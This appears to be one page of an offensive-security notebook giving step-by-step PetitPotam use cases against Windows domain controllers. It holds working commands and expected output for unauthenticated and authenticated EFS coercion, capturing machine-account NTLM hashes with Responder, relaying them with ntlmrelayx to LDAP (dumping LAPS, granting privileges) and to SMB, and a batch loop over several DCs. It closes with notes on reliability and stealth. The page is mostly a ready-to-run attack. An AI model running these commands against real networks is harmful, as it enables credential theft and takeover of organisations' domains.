# PetitPotam — Hands-On Use Cases

---

## Use Case 1: Unauthenticated EFS Coercion (No Creds Needed)

**Objective:** Coerce DC without any domain credentials (most targets allow this).

**MITRE ATT&CK:** T1187 (Forced Authentication), T1040 (Traffic Interception)

### Step 1: Start Responder

```bash
sudo responder -i eth0 -A
```

### Step 2: Run PetitPotam (unauthenticated)

```bash
python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99

# Expected output:
# [*] Targeting \\192.168.1.10
# [*] Listening on 192.168.1.99
# [+] Coercion attempt initiated
# [*] Waiting for callback from 192.168.1.10...
# [+] NTLM callback received from CORP\DC01$
```

### Step 3: Observe NTLM capture in Responder

```
[+] NTLM hash captured:
CORP\DC01$::CORP:1122334455667788:8899aabbccddeeff...
```

---

## Use Case 2: Authenticated Coercion (With Domain Credentials)

**Objective:** Use valid domain creds for more reliable EFS RPC binding.

```bash
python3 PetitPotam.py \
  -t 192.168.1.10 \
  -l 192.168.1.99 \
  -u 'CORP\attacker' \
  -p 'password'

# Expected:
# [*] Authenticating as CORP\attacker...
# [+] Authentication successful
# [*] Initiating EFS coercion...
# [+] Callback received from DC01$
```

---

## Use Case 3: Relay to DC LDAP (Privilege Escalation)

**Objective:** Coerce DC, relay machine account auth to LDAP for privilege escalation.

### Step 1: Start ntlmrelayx with LDAP relay

```bash
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t ldap://192.168.1.10 \
  --dump-laps \
  -socks
```

### Step 2: Run PetitPotam

```bash
python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99
```

### Step 3: Observe relay success

ntlmrelayx logs:
```
[+] Successfully authenticated to LDAP as CORP\DC01$
[+] Dumping LAPS...
[+] Granting attacker LDAP privileges...
```

---

## Use Case 4: Relay to File Server SMB (SAM Dump)

**Objective:** Coerce DC, relay to file server for administrative share access.

```bash
# Start ntlmrelayx targeting file server
python3 -m impacket.examples.ntlmrelayx \
  --no-http \
  -t smb://192.168.1.50 \
  -socks

# Run PetitPotam
python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99

# Result: ntlmrelayx relays DC machine account to file server, gains admin access
```

---

## Use Case 5: Batch Coercion (Multiple Targets)

**Objective:** Loop through multiple DCs, coercing each one.

```bash
#!/bin/bash
targets=("192.168.1.10" "192.168.1.11" "192.168.1.12")

for target in "${targets[@]}"; do
  echo "[*] Coercing $target..."
  python3 PetitPotam.py -t "$target" -l 192.168.1.99
  sleep 5
done
```

All captured NTLM hashes go to Responder logs, enabling batch offline cracking or relay.

---

## Use Case 6: Verbose Mode (Troubleshooting)

```bash
python3 PetitPotam.py -t 192.168.1.10 -l 192.168.1.99 -v

# Verbose output shows RPC binding attempts, method calls, timeouts, etc.
```

---

## Key Operational Notes

**Why unauthenticated works:** EFS RPC `EfsRpcEncryptFileSrv` is often open to unauthenticated callers on DCs. If it fails, auth may be required.

**Speed:** Extremely fast (single RPC call, ~1 second for callback).

**Reliability:** Very high (~95%+) on modern DCs; only fails if EFS RPC is explicitly disabled (rare).

**Detection:** UNC path callback is highly visible in network logs; tool is not stealthy.

**Relay success rate:** If relay enabled, success depends on SMB signing / LDAP signing policies.

---

**Next:** See `03 - Source Evidence.md`, `04 - Target Evidence.md`, `05 - Detection and Hunting.md`.
